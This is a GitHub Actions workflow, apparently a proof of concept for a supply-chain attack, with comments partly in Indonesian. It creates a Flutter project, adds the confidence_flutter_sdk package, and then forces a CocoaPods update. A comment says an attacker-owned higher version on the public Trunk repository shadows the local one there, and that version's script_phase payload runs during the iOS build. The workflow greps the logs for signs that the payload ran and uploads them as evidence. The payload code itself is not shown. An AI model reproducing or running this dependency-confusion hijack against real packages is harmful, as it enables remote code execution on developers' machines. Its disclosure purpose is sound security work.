name: Supply Chain RCE Proof of Concept (Implicit Resolution)
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Silent Hijack (Natural Sequence)
        run: |
          # 1. INITIALIZATION
          rm -rf rce_test
          flutter create rce_test
          cd rce_test
          
          # 2. FOLLOW OFFICIAL DOCUMENTATION
          echo "=== Adding SDK via Official Instructions ==="
          flutter pub add confidence_flutter_sdk:0.2.1
          
          cd ios
          # Bypass platform version constraint agar build tidak stuck
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' Podfile

          echo "=== First Time Resolution (Developer Step) ==="
          # Jalankan pod install pertama kali untuk membuat lockfile
          # Di sini CocoaPods akan mencoba memetakan dependensi
          pod install --verbose || true
          
          echo "=== Triggering Semantic Precedence Hijack ==="
          # Sekarang kita paksa update. Karena di Trunk ada 2.0.6 (milik lu)
          # dan di lokal cuma ada 0.2.1, CocoaPods secara algoritma
          # akan memilih versi publik yang lebih tinggi.
          pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
          
          echo "=== Verify Shadowing Success (Checking Lockfile) ==="
          grep -A 1 "confidence_flutter_sdk" Podfile.lock
          
          cd ..
          # 3. EXECUTION PHASE
          echo "=== Launching Build to Trigger Payload ==="
          # Payload script_phase akan dieksekusi oleh Xcode sebelum kompilasi
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Verification: Search for Payload Execution ==="
          grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"

      - name: Upload Evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rce-evidence-natural
          path: |
            rce_test/ios/pod_update.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
